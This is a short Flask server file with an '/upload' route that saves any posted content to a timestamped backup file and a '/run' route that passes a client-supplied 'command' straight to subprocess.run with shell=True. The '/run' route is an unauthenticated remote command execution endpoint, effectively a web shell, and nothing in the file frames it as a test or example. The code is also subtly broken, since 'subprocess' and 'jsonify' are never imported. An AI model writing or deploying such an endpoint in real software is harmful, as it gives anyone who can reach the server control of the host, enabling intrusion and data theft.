from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    with open(f"backup_{datetime.datetime.now().isoformat()}.txt", "w", encoding="utf-8") as f:
        f.write(data.get("content", ""))
    return {"status": "success"}

@app.route("/run", methods=["POST"])
def run_command():
    data = request.json
    cmd = data.get("command")

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return jsonify({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "code": result.returncode
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500
